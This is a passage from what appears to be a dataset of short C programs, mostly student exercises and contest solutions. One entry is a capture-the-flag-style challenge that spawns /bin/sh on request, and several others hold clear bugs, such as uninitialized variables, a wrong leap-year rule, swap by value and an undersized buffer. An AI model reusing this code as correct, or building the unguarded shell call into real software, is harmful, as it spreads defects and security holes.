%d\\n\", __isspace('\\n'));\n printf(\"e caractere de controle: %d\\n\", iscntrl('$'));\n printf(\"e caractere de pontuacao: %d\\n\", ispunct(':'));\n printf(\"e caractere de imprimivel: %d\\n\", (0 ? isprint(' ') : ((unsigned)(' ')-0x20) < 0x5f));\n printf(\"\\nmaiuscula para minuscula: %c\\n\", tolower('A'));\n printf(\"minuscula para maiuscula: %c\\n\", toupper('a'));\n printf(\"maiuscula para minuscula: %c\\n\", tolower('X'));\n printf(\"minuscula para maiuscula: %c\\n\", toupper('y'));\n}",
    "#include <stdio.h>\nint main() {\n    int p[100];\n    int z = 0;\n    for (int x = 100; x > 1; x--) {\n        for (int n = 2; x % n != 0; n++) {\n            if (n == x - 1) {\n                p[z++] = x;\n                break;\n            }\n        }\n    }\n    while (z >= 0) printf(\"%d \", p[z--]);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nchar randchar(void)\n{\n char r;\n r = rand() % 26;\n r += 'A';\n return(r);\n}\nint main()\n{\n int a;\n srand( (unsigned)time(((void*)0)) );\n printf(\"Today's random word: \");\n for(a=0;a<7;a++)\n  putchar( randchar() );\n putchar('\\n');\n return(0);\n}",
    "volatile int y = 0;\nvoid incr() {\n  y = (y + 1) % 2;\n  incr();\n}\nint main() {\n  incr();\n  return 0;\n}",
    "#include<stdio.h>\nint main(int argc, char const *argv[])\n{\n    double d;\n    scanf(\"%lf\",&d);\n    printf(\"%.8f\",d);\n    return 0;\n}",
    "#include <stdio.h>\n#include <ctype.h>\nint main(){\n    printf(\"%d\\n\",isxdigit('0'));\n    printf(\"%d\\n\",isxdigit('a'));\n    printf(\"%d\\n\",isxdigit('A'));\n    printf(\"%d\\n\",isxdigit('g'));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\nint potencia(int b, int e){\n    int r ;\n    for (int i = 0; i < e; i++)\n    {\n       r += b * e;\n    }\n    return r;\n}\nint main(){\n    int b = 0;\n    int e = 0;\n    printf(\"Enter base: \\n\");\n        scanf(\"%i\", &b);\n    printf(\"Enter exponent: \\n\");\n        scanf(\"%i\", &e);\n    printf(\"The result is: %i\\n\", potencia(b,e));\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int row, col, ans;\n    scanf(\"%d %d\", &row, &col);\n    ans = col - row + 1;\n    if (ans % 2 == 0) {\n        printf(\"0\\n\");\n    } else {\n        printf(\"1\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int n = 0, q = 0, q2 = 0, r = 1, c = 0;\n scanf(\"%d\", &n);\n scanf(\"%d\", &q2);\n for (int i = 1; i < n; i++)\n {\n  scanf(\"%d\", &c);\n  if ((i % 2) == 1 && r != 0)\n  {\n   q = c; if (q2 <= q) r = 1; else r = 0;\n  }\n  if ((i % 2) == 0 && r != 0) {\n   q2 = c; if (q <= q2) r = 1; else r = 0;\n  }\n }\n printf(\"%d\\n\", r);\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint calc(int n)\n{\n    if (n == 0 || n == 1)\n    {\n        return 1;\n    }\n    int array[100000] = {0};\n    array[0] = 1;\n    int i=0,j=0;\n    int valid = 1;\n    for ( i = 2; i <= n; i++)\n    {\n        long carry = 0;\n        for ( j = 0; j < valid; j++ )\n        {\n            long multipleResult = array[j] * i + carry;\n            array[j] = (unsigned int)(multipleResult %10);\n            carry = multipleResult / 10;\n        }\n        while (carry != 0)\n        {\n            array[valid++] = (unsigned int)(carry %10);\n            carry = carry/10;\n        }\n    }\n    return valid;\n}\nint main(int argc, char *argv[])\n{\n    int depth;\n    unsigned num=0;\n    if (scanf(\"%d\", &depth))\n    {\n        num = calc(depth);\n        printf(\"num:%u\\n\",num);\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main(){\n int vector[10], i, suma=0;\n printf(\"Dame 10 valores para guardar en el vector\\n\");\n for(i=0;i<10;i++){\n  scanf(\"%d\", &vector[i]);\n  suma=suma+vector[i];\n }\n printf(\"Suma del vector es:%d\\n\", suma);\n return(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void) {\n printf(\"Welcome to the Flag Charity. Do you want a shell? [Y/n]\\n\");\n char line[10];\n if(!fgets(line, sizeof(line), (stdin)) || line[0] == 'n' || line[0] == 'N') {\n  printf(\"Hmm, guess you don't want a free flag...\\n\");\n }\n else {\n  printf(\"Thought so. Here's your free shell!\\n\");\n  system(\"/bin/sh\");\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\nint * move(int *cards, int card_num, int player_num, int skip);\nint * init_deck(int card_num);\nvoid print_deck(int *deck, int card_num);\nint next_index(int *deck, int card_num, int curr_index, int skip);\nvoid sort(int *cards, int card_num);\nvoid sort_helper(int *cards, int left, int right);\nvoid swap(int *cards, int i, int j);\nint main() {\n  int player_num, card_num, skip;\n  scanf(\"%d %d %d\", &player_num, &card_num, &skip);\n  int *deck = init_deck(card_num);\n  int i;\n  int *cand = move(deck, card_num, player_num, skip);\n  sort(cand, card_num / player_num);\n  for (i = 0; i < card_num / player_num; i++)\n    printf(\"%d\\n\", cand[i]);\n  exit(0);\n}\nint * move(int *cards, int card_num, int player_num, int skip) {\n  int cards_per_player = card_num / player_num;\n  int *cand = malloc(sizeof(int) * cards_per_player);\n  int i = 0, index = 0;\n  int count = 1;\n  while (i < cards_per_player) {\n    if (count == player_num) {\n      cand[i++] = cards[index];\n    }\n    cards[index] = 0;\n    count = (count++) % player_num;\n    if (i < cards_per_player)\n      index = next_index(cards, card_num, index, skip);\n  }\n  return cand;\n}\nint next_index(int *deck, int card_num, int curr_index, int skip) {\n  curr_index = (curr_index + 1) % card_num;\n  if (skip == 0) {\n    if (deck[curr_index] != 0)\n      return curr_index;\n    else {\n      next_index(deck, card_num, curr_index, skip);\n    }\n  }\n  if (deck[curr_index] == 0)\n    next_index(deck, card_num, curr_index, skip);\n  else\n    next_index(deck, card_num, curr_index, skip - 1);\n}\nint * init_deck(int card_num) {\n  int *deck = malloc(sizeof(int) * card_num);\n  int i;\n  for (i = 0; i < card_num; i++)\n    deck[i] = i + 1;\n  return deck;\n}\nvoid print_deck(int *deck, int card_num) {\n  int i;\n  for (i = 0; i < card_num; i++)\n    printf(\"%d \", deck[i]);\n  printf(\"\\n\");\n}\nvoid sort(int *cards, int card_num) {\n  sort_helper(cards, 0, card_num - 1);\n}\nvoid sort_helper(int *cards, int left, int right) {\n  int i, last;\n  if (left >= right)\n    return;\n  last = left;\n  for (i = left + 1; i <= right; i++)\n    if (cards[i] < cards[left])\n      swap(cards, ++last, i);\n  swap(cards, left, last);\n  sort_helper(cards, left, last - 1);\n  sort_helper(cards, last + 1, right);\n}\nvoid swap(int *cards, int i, int j) {\n  int tmp;\n  tmp = cards[i];\n  cards[i] = cards[j];\n  cards[j] = tmp;\n}",
    "#include <stdio.h>\n\n\n\n\n\nint main() {\n    int t = 0, a, b, c;\n    for (scanf(\"%d\", &t); t != 0; t--) {\n        scanf(\"%d%d\", &a, &b);\n        if (a > b) {\n            { int t_ = a; a = b; b = t_; };\n        }\n        c = ((2 * a) > (b) ? (2 * a) : (b));\n                                         ;\n        printf(\"%d\\n\", c * c);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\ndouble RegulaFalsi(double F(double), double, double, double);\ndouble f(double p) {\n return (p * exp(p) - cos(p));\n}\nint main(void) {\n double x = RegulaFalsi(f, 0, 1, 0.001);\n printf(\"Approximate zero of f(x): %.4lf\\n\", x);\n return 0;\n}\ndouble RegulaFalsi(double F(double), double X0, double Xn, double E) {\n double X, fa, fb, d;\n do {\n  fa = F(X0), fb = F(Xn);\n  X = (X0 * fb - Xn * fa) / (fb - fa);\n  if (F(X) < 0)\n   d = X - X0, X0 = X;\n  else if (F(X) > 0)\n   d = X - Xn, Xn = X;\n } while((d) > 0 ? (d) : -(d) > E);\n return X;\n}",
    "#include <stdio.h>\nvoid displayBits(unsigned int value);\nint main(void)\n{\n   unsigned int number1 = 65535;\n   unsigned int mask = 1;\n   puts(\"The result of combining the following\");\n   displayBits(number1);\n   displayBits(mask);\n   puts(\"using the bitwise AND operator & is\");\n   displayBits(number1 & mask);\n   number1 = 15;\n   unsigned int setBits = 241;\n   puts(\"\\nThe result of combining the following\");\n   displayBits(number1);\n   displayBits(setBits);\n   puts(\"using the bitwise inclusive OR operator | is\");\n   displayBits(number1 | setBits);\n   number1 = 139;\n   unsigned int number2 = 199;\n   puts(\"\\nThe result of combining the following\");\n   displayBits(number1);\n   displayBits(number2);\n   puts(\"using the bitwise exclusive OR operator ^ is\");\n   displayBits(number1 ^ number2);\n   number1 = 21845;\n   puts(\"\\nThe one's complement of\");\n   displayBits(number1);\n   puts(\"is\");\n   displayBits(~number1);\n}\nvoid displayBits(unsigned int value)\n{\n   unsigned int displayMask = 1 << 31;\n   printf(\"%10u = \", value);\n   for (unsigned int c = 1; c <= 32; ++c) {\n      putchar(value & displayMask ? '1' : '0');\n      value <<= 1;\n      if (c % 8 == 0) {\n         putchar(' ');\n      }\n   }\n   putchar('\\n');\n}",
    "#include <stdio.h>\nint main() {\n    int i,j=0,k,l=1;\n    scanf(\"%d\",&i);\n    while(j<i){\n        scanf(\"%d\",&k);\n        l*=k;\n        j++;\n    }\n    printf(\"%d\",l);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int age;\n    printf(\"Digite sua idade: \");\n    scanf(\"%d\", &age);\n    if(age >= 18) {\n        printf(\"Parab\u00e9ns, voc\u00ea j\u00e1 tem idade para tira a sua carteira!\");\n    } else {\n        printf(\"Fim\");\n    }\n    return 0;\n}",
    "int main() {\n  int i = 0;\n  while(i < 10) i++;\n  if(i < 5) {\n    return 1;\n  } else if(i < 20) {\n    return 2;\n  } else {\n    return 3;\n  }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint stepPermsMemo(int n,int memo[]){\n    printf(\"n: %d memo: %d\\t\",n,memo[n]);\n    if(n<0){\n        return 0;\n    }else if(n==0){\n        return 1;\n    }else if(memo[n]>-1){\n        return memo[n];\n    }else{\n        memo[n]=stepPermsMemo(n-1,memo)+stepPermsMemo(n-2,memo)+stepPermsMemo(n-3,memo);\n        return memo[n];\n    }\n}\nint stepPerms(int n) {\n    int memo[n+1];\n    for(int i=0;i<=n;i++){\n        memo[i]=-1;\n    }\n    return stepPermsMemo(n,memo);\n}\nint main()\n{\n  printf(\"%d\\n\",stepPerms(3));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint get_digit(int n)\n{\n    int digit = 1;\n    while (n /= 10) {\n        ++digit;\n    };\n    return digit;\n}\nint main(){\n    int array[10];\n    int i;\n    for (i=0; i<9; i++){\n        array[i] = rand() % 99 + 10;\n        printf(\"%d \", array[i]);\n    }\n    int min_i = 0;\n    int max_i = 0;\n    for (i=0; i<9; i++){\n        if (array[i] < array[min_i]){\n            min_i = i;\n        }\n    }\n    for (i=0; i<9; i++){\n        if (array[i] > array[max_i]){\n            max_i = i;\n        }\n    }\n    printf(\"\\n\");\n    for (i=0; i<9; i++){\n        if (i == min_i || i == max_i){\n            printf(\"%d \", array[i]);\n        }else{\n            for(int j=0; j<get_digit(array[i]) + 1; j++){\n                printf(\" \");\n            }\n        }\n    }\n    printf(\"\\n\\n----------------------------\\n\");\n}",
    "#include <stdio.h>\nint main(int argc, char *argy[])\n{\n printf(\"oi mundo cruel!\\n\");\n}",
    "#include <stdio.h>\nfloat max(float a, float b, float c);\nfloat min(float a, float b, float c);\nfloat absolute(float a);\nfloat rectangle_area(float px1, float px2, float px3, float py1, float py2, float py3);\nfloat triangle_area(float xa, float xb, float ya, float yb);\nint main()\n{\n  float x1, x2, x3;\n  float y1, y2, y3;\n  float ans;\n  scanf(\"%f\", &x1);\n  scanf(\"%f\", &y1);\n  scanf(\"%f\", &x2);\n  scanf(\"%f\", &y2);\n  scanf(\"%f\", &x3);\n  scanf(\"%f\", &y3);\n  ans = rectangle_area(x1, x2, x3, y1, y2, y3) - triangle_area(x1, x2, y1, y2)\n                - triangle_area(x2, x3, y2, y3) - triangle_area(x3, x1, y3, y1);\n  printf(\"S = %f\\n\", ans);\n  return 0;\n}\nfloat triangle_area(float xa, float xb, float ya, float yb)\n{\n  return (absolute(xa - xb) * absolute(ya - yb)) / 2.0;\n}\nfloat rectangle_area(float px1, float px2, float px3, float py1, float py2, float py3)\n{\n  float x_max, x_min, y_max, y_min;\n  x_max = max(px1, px2, px3);\n  x_min = min(px1, px2, px3);\n  y_max = max(py1, py2, py3);\n  y_min = min(py1, py2, py3);\n  return (x_max - x_min) * (y_max - y_min);\n}\nfloat max(float a, float b, float c)\n{\n  float max;\n  if (a < b)\n    max = b;\n  else\n    max = a;\n  if (max < c)\n    return c;\n  else\n    return max;\n}\nfloat min(float a, float b, float c)\n{\n  float min;\n  if (a < b)\n    min = a;\n  else\n    min = b;\n  if (min < c)\n    return min;\n  else\n    return c;\n}\nfloat absolute(float a)\n{\n  if(a < 0.0)\n    return -a;\n  else\n    return a;\n}",
    "#include <stdio.h>\nint main() {\n puts(\"NFC West       W   L  T\\n-----------------------\\nSeattle        13  3  0\\nSan Francisco  12  4  0\\nArizona        10  6  0\\nSt. Louis      7   9  0\\n\\nNFC North      W   L  T\\n-----------------------\\nGreen Bay      8   7  1\\nChicago        8   8  0\\nDetroit        7   9  0\\nMinnesota      5  10  1\");\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(int argc, char** argv)\n{\n    fprintf((stdout), \"I am the child_sig_while_execv_simple_app \\n\");\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint consecutiveNumbersSum(int N){\n}\nint main()\n{\n int left,right;\n int sum;\n int given = 15;\n int count = 0;\n for (sum=0, right=1; sum<given; sum +=right, right++)\n ;\n printf(\"\\nright =  %d\", right);\n for(left=1, right--; left<= given;)\n if(sum>given)\n  sum -=(left++);\n else\n {\n  if(sum == given)\n  {\n  printf(\"\\n%d = sum from %d to %d\", given, left, right);\n  count++;\n  }\n  sum +=(++right);\n }\n if(count>0)\n  printf(\"\\nthere are %d solutions\", count);\n else\n     printf(\"\\nno solutions\");\n}",
    "int main()\n{\n  int *p, *q, *r;\n  int a = 0, b = 1, c = 2, d = 4;\n  p = &a;\n  q = (a == b)? &c: &d;\n  r = (a<b) ? &c: q;\n  return(0);\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nunsigned char *p;\nvoid interpreter(char *);\nint main(int argc, char *argv[])\n{\n  if (argc < 2)\n  {\n    printf(\"missing brainfuck command\\n\");\n    exit(1);\n  }\n  p = malloc(sizeof(unsigned char) * 30000);\n  char *code_ = malloc(sizeof(char) * strlen(argv[1]));\n  strcpy(code_, argv[1]);\n  interpreter(code_);\n  return 0;\n}\nvoid interpreter(char *code)\n{\n  char current_token;\n  unsigned int i = 0;\n  unsigned int j = 0;\n  for (i = 0; code[i] != 0; ++i)\n  {\n    current_token = code[i];\n    if (current_token == '>')\n    {\n      ++p;\n    }\n    else if (current_token == '<')\n    {\n      --p;\n    }\n    else if (current_token == '+')\n    {\n      ++*p;\n    }\n    else if (current_token == '-')\n    {\n      --*p;\n    }\n    else if (current_token == '.')\n    {\n      putchar(*p);\n    }\n    else if (current_token == ',')\n    {\n      *p = getchar();\n    }\n    else if (current_token == ']' && *p)\n    {\n      j = 1;\n      while (j > 0)\n      {\n        current_token = code[--i];\n        if (current_token == '[')\n        {\n          --j;\n        }\n        else if (current_token == ']')\n        {\n          ++j;\n        }\n      }\n    }\n    else\n    {\n      continue;\n    }\n  }\n}",
    "#include <stdio.h>\nlong int factorial(int x)\n{\n    int i;\n    long int fac;\n    fac = x;\n    for (i = 1; i < x; i++)\n    {\n        fac = fac * (x - i);\n    }\n    return fac;\n}\nint main()\n{\n    long int f1, f2, f3;\n    int n;\n    float C;\n    scanf(\"%d\", &n);\n    f1 = factorial(2 * n);\n    f2 = factorial(n + 1);\n    f3 = factorial(n);\n    C = f1 / (f2 * f3);\n    printf(\"%0.2f\", C);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    FILE * arq;\n    char texto[20],nome[20];\n    int i, result;\n    float a;\n    arq = fopen(\"textoFormatado.txt\", \"r\");\n    if(arq == ((void*)0)) {\n        printf(\"Erro na abetura do arquivo\\n\");\n        system(\"pause\");\n        exit(1);\n    }\n    fscanf(arq, \"%s%s\", texto, nome);\n    printf(\"%s %s\\n\", texto, nome);\n    fscanf(arq, \"%s %d\",texto, &i);\n    printf(\"%s %d\\n\", texto, i);\n    fscanf(arq, \"%s %f\",texto, &a);\n    printf(\"%s %f\\n\", texto, a);\n    if (result < 0)\n        printf(\"Erro na escrita\\n\");\n    fclose(arq);\n    system(\"pause\");\n    return 0;\n}",
    "#include<stdio.h>\nint fibonacci(int n)\n{\n  if(n==0)\n    return 0;\n  else if(n==1)\n    return 1;\n  else\n  return (fibonacci(n-1) + fibonacci(n-2));\n}\nint main()\n{\n  int sum=0,i,n,a;\n  printf(\"Enter the no. of elments displayed in the series: \");\n  scanf(\"%d\",&n);\n  printf(\"Series: \");\n  for(i=0;i<n;i++)\n  {\n    a=fibonacci(i);\n    sum+=a;\n    printf(\"%d \",a );\n  }\n  printf(\"\\nSum = %d\\n\",sum );\n  return 0;\n}",
    "#include <stdio.h>\nint k = 4;\nint main(void) {\n int i = 50;\n unsigned int j = i * 2;\n double k = 1.0;\n{\n float i = 5.0;\n printf(\"The value of i is %3f\\n\", i);\n k = i * j;\n i *= 6;\n printf(\"i is now a float with value %3.2f\\n\",i);\n printf(\"k is now a double with value %3.2f\\n\",k);\n}\n (double) j;\n i = k + i;\n printf(\"Now , the value of i is %d\\n\", i);\n return 0;\n}",
    "#include <stdio.h>\nvoid h(int (*gp) (int), int n) {\n printf(\"%d\\n\", gp(n));\n}\nint g(int y) {\n return y + 5;\n}\nint f(int x) {\n return x + 2;\n}\nint main() {\n int n;\n int (*fp)(int);\n scanf(\"%d\", &n);\n fp = f;\n h(fp, n);\n fp = g;\n h(fp, n);\n h(f, n);\n h(g, n);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <fcntl.h>\nint main(int argc, char **argv){\n    char *file = argv[1];\n    char *newName = argv[2];\n    char *pwd = getcwd(((void*)0),0);\n    char path1[strlen(file)+strlen(pwd)+2];\n    char path2[strlen(newName)+strlen(pwd)+2];\n    sprintf(path1,\"%s/%s\",pwd,file);\n    sprintf(path2,\"%s/%s\",pwd,newName);\n    int fd1 = link(path1,path2);\n    int fd2 = unlink(path1);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void)\n{\n    int S[8]={5,1,5,2,1,2,1,5};\n    int m=5, n=8, i, C[5], T[8];\n    printf(\"Pre-sort array: \");\n    for(i=0;i<n;i++)\n        printf(\"%d \", S[i]);\n    printf(\"\\n\");\n    for(i=0;i<m;i++)\n        C[i]=0;\n    for(i=0;i<n;i++)\n        T[i]=0;\n    for(i=0;i<n;i++)\n        C[S[i]-1]=C[S[i]-1]+1;\n    for(i=1;i<m;i++)\n        C[i]=C[i]+C[i-1];\n    for(i=n-1;i<0;i--)\n    {\n        T[C[S[i]-1]-1]=S[i];\n        C[S[i]-1]=C[S[i]-1]-1;\n    }\n    printf(\"Sorted array:   \");\n    for(i=0;i<n;i++)\n        printf(\"%d \", T[i]);\n    printf(\"\\n\");\n    system(\"PAUSE\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdint.h>\n\n\n\n\nvoid find_data(uint8_t data[], const int num)\n{\n int ende=-1;\n int n;\n for (n=((((225)-(45)+1)*3)-50)/3; n<(((225)-(45)+1)*3)/3-1; n++) {\n  if ( (data[n*3+1]==0xff) &&\n       (data[n*3+2]==0xff) &&\n       (data[n*3+3]==0x00) &&\n       (data[n*3+4]==0x00) &&\n       (data[n*3+5]==0x00) ) {\n   ende=n*3-2;\n   break;\n  }\n }\n if (ende<0) return;\n int anfang=ende-512+1;\n for (n=0;n<512+2; n++) printf(\"%02x\", data[anfang+n]^0xff);\n printf(\"\\n\");\n int sum=0;\n uint16_t xor=0;\n for (n=0; n<512; n++) {\n  sum=sum+data[anfang+n];\n  uint16_t x=data[anfang+n];\n  if (n%2==0) x=x<<8;\n  xor=xor^x;\n }\n printf(\"Ende=%d sum=%08x xor=%04x %02x %02x   %02x\\n\", ende, sum, xor, data[ende+1], data[ende+2], data[anfang]);\n}\nint main(int argc, char *argv[])\n{\n int olineno=0;\n int lineno=0;\n char bits[64];\n uint8_t data[(((225)-(45)+1)*3)];\n int cnt=0;\n while (scanf(\"%d%s\", &lineno, bits)==2) {\n  if (lineno<olineno) {\n   find_data(data, cnt);\n   cnt=cnt+1;\n   memset(data, 0, sizeof(data));\n  }\n  olineno=lineno;\n  int l=lineno-(45);\n  if (l<0) l=0;\n  int n;\n  for (n=0; n<24; n++) {\n   int p=l*24+n;\n   if (p<0) p=0;\n   int op=p/8;\n   int bp=p%8;\n   if (op>=(((225)-(45)+1)*3)) op=(((225)-(45)+1)*3)-1;\n   if (bits[n]=='1') data[op]=data[op]|(1<<bp);\n  }\n }\n fprintf((stderr), \"linecount=%d\\n\", cnt);\n return 0;\n}",
    "#include <stdio.h>\n#include <ctype.h>\nint atoi(char *s)\n{\n  int n, sign;\n  while (__isspace(*s))\n    s++;\n  sign = (*s == '-') ? -1 : 1;\n  if (*s == '+' || *s == '-')\n    s++;\n  for (n = 0; (0 ? isdigit(*s) : ((unsigned)(*s)-'0') < 10); ++s)\n    n = 10 * n + (*s - '0');\n  return sign * n;\n}\nint main()\n{\n  int i = atoi(\" -97 \");\n  printf(\"%d\\n\", i);\n  return 0;\n}",
    "#include <stdio.h>\nvoid swap (int a,int b)\n{\n int t = a;\n a = b;\n b = t;\n}\nint main()\n{\n int a = 5;\n int b = 6;\n swap(a,b);\n printf(\"a=%d,b=%d\\n\",a,b);\n return 0;\n}",
    "#include <stdlib.h>\n#include <stdbool.h>\n#include <stdio.h>\n_Bool case1 () {\n    int r = strtoul(\" 123456\", 0, 10);\n    if (r != 123456) {\n        printf(\"case1: interpretation error (got %d)\\n\", r);\n        return 0;\n    }\n    return 1;\n}\n_Bool case2 () {\n    int r = strtoul(\" 123456\", 0, 16);\n    if (r != 0x123456) {\n        printf(\"case2: interpretation error (got %d)\\n\", r);\n        return 0;\n    }\n    return 1;\n}\n_Bool case3 () {\n    int r = strtoul(\"0x123a\", 0, 16);\n    if (r != 0x123a) {\n        printf(\"case3: interpretation error (got %d)\\n\", r);\n        return 0;\n    }\n    return 1;\n}\n_Bool case4 () {\n    int r = strtoul(\"0x3fab\", 0, 0);\n    if (r != 0x3fab) {\n        printf(\"case4: interpretation error (got %d)\\n\", r);\n        return 0;\n    }\n    return 1;\n}\nint main () {\n    if (!case1()) {\n        return 1;\n    }\n    if (!case2()) {\n        return 1;\n    }\n    if (!case3()) {\n        return 1;\n    }\n    if (!case4()) {\n        return 1;\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main()\n{\n    int t,n,x[100],i;\n    scanf(\"%d\",&t);\n    while(t--)\n    {\n        scanf(\"%d\",&n);\n        for(i=0; i<n; i++)\n        {\n            scanf(\"%d\",&x[i]);\n        }\n        int min=1,high=0;\n        for(i=0; i<n; i++)\n        {\n            int cnet=0;\n            if(i+1==n)break;\n            if(x[i]<x[i+1])\n            {\n                cnet=abs(x[i]-x[i+1]);\n            }\n            if(cnet<=2)\n            {\n                high++;\n                min++;\n            }\n            else if(cnet<=1)high++;\n            else if(cnet<=3)min=high;\n        }\n        printf(\"%d %d\\n\",min,high);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(void)\n{\n    int year;\n    printf(\"Digite um ano maior que 1582: \\n\");\n    scanf(\"%d\", &year);\n    if(year%400 == 0 || year%4 == 0) {\n        printf(\"Este \u00e9 um ano Bisexto \\n\");\n    } else\n    {\n        printf(\"N\u00e3o \u00e9 um ano \u00e9 Bisexto \\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int i, *p, dim;\n    printf(\"informe o tamanho do vetor: \");\n    scanf(\"%d\", &dim);\n    p = malloc(dim * sizeof(int));\n    printf(\"Informe os valores: \");\n    for (i = 0; i < dim; i++)\n    {\n        scanf(\"%d\", &p[i]);\n    }\n    printf(\"Os valores informados: \");\n    for (i = 0; i < dim; i++)\n    {\n        printf(\"%d \", p[i]);\n    }\n    p = realloc(p,3*sizeof(int));\n    printf(\"\\nOs valores realocados sao: \");\n    for(i=0;i<3;i++)\n    {\n        printf(\"%d \", p[i]);\n    }\n    free(p);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(void)\n{\n    int i, t, n, j, total, amount;\n    char temp[10];\n    scanf(\"%d\", &t);\n    for (i = 0; i < t; i++) {\n        printf(\"Case %d:\\n\", i+1);\n        total = 0;\n        scanf(\"%d\", &n);\n        for (j = 0; j < n; j++) {\n            scanf(\"%s\", temp);\n            if (strcmp(temp, \"donate\") == 0) {\n                scanf(\"%d\", &amount);\n                total += amount;\n            }\n            else {\n                printf(\"%d\\n\", total);\n            }\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nfloat roomIndexCalculate(float length,float width,float x, float y);\nint main(){\n float roomIndex;\n float length;\n float width;\n int cont;\n float armaturelength;\n float workingheinht;\n do{\n printf(\"Enter the lengt\\n\");\n scanf(\"%f\",&length);\n printf(\"Enter the with\\n\");\n scanf(\"%f\",&width);\n printf(\"Enter the armature length\\n\");\n scanf(\"%f\",&armaturelength);\n printf(\"Enter the working height\\n\");\n scanf(\"%f\",&workingheinht);\n roomIndex = roomIndexCalculate(length,width,armaturelength,workingheinht);\n printf(\"Room index : %.2f\\n\\n\",roomIndex);\n printf(\"For Quit press any number , for contuniue press 1 \");\n scanf(\"%d\",&cont);\n }while(cont==1);\n    return 1;\n }\nfloat roomIndexCalculate(float length,float width,float x, float y){\nfloat roomindex;\nfloat l1;\nfloat w1;\nfloat x1;\nfloat y1;\nl1= length/100;\nw1= width/100;\nx1= x/100;\ny1= y/100;\nroomindex = ((w1*8)+(l1*2))/(10*(2.7-(x1+y1)));\nreturn roomindex;\n}",
    "void funcaoDaQuestao(int *vetorA,int *vetorB) {\n    int vetorC[ ( (sizeof(vetorA) > sizeof(vetorB)) ? sizeof(vetorA) : sizeof(vetorB) ) ];\n    int i,n,z=0;\n    for(i=0;i<sizeof(vetorA);i++){\n        for(n=0;n<sizeof(vetorB);n++){\n            if(vetorA[i] == vetorB[n]){\n                vetorC[z] = vetorA[i];\n                z++;\n            }\n        }\n    }\n}\nint main() {\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint max(int a, int b)\n{\n    if(a>b)\n        return a;\n    else\n        return b;\n}\nint main() {\n    int a[101], b[101], k, res[101];\n    int lcs[102][102] = {0};\n    int n,m, i, j;\n    scanf(\"%d %d\", &n, &m);\n    for(i=0; i<n; ++i)\n        scanf(\"%d\", &a[i]);\n    for(i=0; i<m; ++i)\n        scanf(\"%d\", &b[i]);\n    for(i=0; i<n; ++i)\n        for(j=0; j<m; ++j)\n        {\n            if(a[i] == b[j])\n                lcs[i+1][j+1] = lcs[i][j] + 1;\n            else\n                lcs[i+1][j+1] = max(lcs[i+1][j], lcs[i][j+1]);\n        }\n    k = lcs[n][m];\n    i=n;\n    j=m;\n    while(lcs[i][j])\n    {\n        if(a[i-1] == b[j-1])\n        {\n            res[--k] = a[i-1];\n            --i;\n            --j;\n        }\n        else\n        {\n            if(lcs[i-1][j] > lcs[i][j-1])\n                --i;\n            else\n                --j;\n        }\n    }\n    for(i=0; i<lcs[n][m]; ++i)\n        printf(\"%d \", res[i]);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main() {\n  char alph; scanf(\"%c\", &alph);\n  alph = (int)alph;\n  if (alph <= 90) {\n    printf(\"A\\n\");\n  }\n  else\n  {\n    printf(\"a\\n\");\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int array[10] = {0};\n    array[1] = 3;\n    int length = sizeof(array) / sizeof(int);\n    for (int i = 0; i < length; i++) {\n        printf(\"%d \", array[i]);\n    }\n    printf(\"\\n\");\n    int array2[10] = {0};\n    if (array == array2) {\n        printf(\"We are equal.\");\n    }\n}",
    "#include<stdio.h>\nint main(){\n    int num1,num2;\n    do{\n        printf(\"Digite um n\u00famero:\\n\");\n        scanf(\"%d%*c\",&num1);\n        printf(\"Digite outro n\u00famero:\\n\");\n        scanf(\"%d%*c\",&num2);\n        if (num1 >num2){\n            printf(\"%d   %d   Descrescente\\n\",num1,num2);\n        }else if (num1 <num2){\n            printf(\"%d   %d   Crescente\\n\",num1,num2);\n        }else{\n            printf(\"%d   %d\\n\",num1,num2);\n        }\n    } while (num1 != num2);\n    return 0;\n}",
